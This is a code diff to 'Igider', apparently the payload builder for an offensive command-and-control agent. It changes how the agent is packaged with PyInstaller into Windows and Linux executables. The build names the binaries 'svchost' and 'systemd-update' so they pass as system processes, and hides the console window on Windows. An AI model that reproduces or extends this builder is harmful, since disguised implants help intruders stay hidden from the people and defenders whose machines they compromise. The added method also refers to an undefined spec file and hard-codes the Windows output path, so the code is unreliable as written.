@@ -120,62 +120,7 @@ class Igider(PayloadType):
                 code = code.replace(key, str(value))
         return code
     
-    def _create_pyinstaller_spec(self,code: str, target_os: str) -> str:
-        """Generate PyInstaller spec file for executable creation."""
-        # Determine values based on target_os
-        exe_name = "svchost" if target_os == "windows" else "systemd-update"
-        console_mode = "False" if target_os == "windows" else "True"
-        target_arch = 'x64' if target_os == 'windows' else None
-        # Remove icon requirement to avoid file not found error
-        icon_line = ''
-        
-        spec_content = textwrap.dedent(f"""
-            # -*- mode: python ; coding: utf-8 -*-
 
-            block_cipher = None
-
-            a = Analysis(
-                ['main.py'],
-                pathex=[],
-                binaries=[],
-                datas=[],
-                hiddenimports=['urllib.request', 'urllib.parse', 'ssl', 'json', 'base64', 'threading', 'time'],
-                hookspath=[],
-                hooksconfig={{}},
-                runtime_hooks=[],
-                excludes=[],
-                win_no_prefer_redirects=False,
-                win_private_assemblies=False,
-                cipher=block_cipher,
-                noarchive=False,
-            )
-
-            pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
-
-            exe = EXE(
-                pyz,
-                a.scripts,
-                a.binaries,
-                a.zipfiles,
-                a.datas,
-                [],
-                name='{exe_name}',
-                debug=False,
-                bootloader_ignore_signals=False,
-                strip=False,
-                upx=False,  # Disabled for cross-platform builds
-                upx_exclude=[],
-                runtime_tmpdir=None,
-                console={console_mode},
-                disable_windowed_traceback=False,
-                argv_emulation=False,
-                target_arch='{target_arch}',
-                codesign_identity=None,
-                entitlements_file=None,
-                {icon_line}
-            )
-        """)
-        return spec_content
 
 
 
@@ -229,8 +174,6 @@ class Igider(PayloadType):
 
         return powershell_loader
 
-
-    
 
     def _create_pyinstaller_spec(self, code: str, target_os: str) -> str:
         """Generate PyInstaller spec file for executable creation."""
@@ -286,6 +229,31 @@ class Igider(PayloadType):
             )
         """)
         return spec_content
+    
+
+    def _build_executable(self, code: str, target_os: str) -> bytes:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            # Write the Python code
+            main_py = os.path.join(temp_dir, "main.py")
+            with open(main_py, "w") as f:
+                f.write(code)
+
+            # PyInstaller command for Windows EXE
+            cmd = ["wine", sys.executable, "-m", "PyInstaller", "--log-level=DEBUG", spec_file] if target_os == "windows" else [sys.executable, "-m", "PyInstaller", "--log-level=DEBUG", spec_file]
+            # Run PyInstaller
+            try:
+                subprocess.run(cmd, check=True, cwd=temp_dir, timeout=300)
+                exe_path = os.path.join(temp_dir, "dist", "svchost.exe")
+                
+                # Verify the EXE is a valid Windows binary
+                if not os.path.exists(exe_path):
+                    raise Exception("EXE not found!")
+                
+                # Read and return the binary
+                with open(exe_path, "rb") as f:
+                    return f.read()
+            except Exception as e:
+                raise Exception(f"Build failed: {str(e)}")
 
     async def build(self) -> BuildResponse:
         """Build the Igider payload with the specified configuration."""
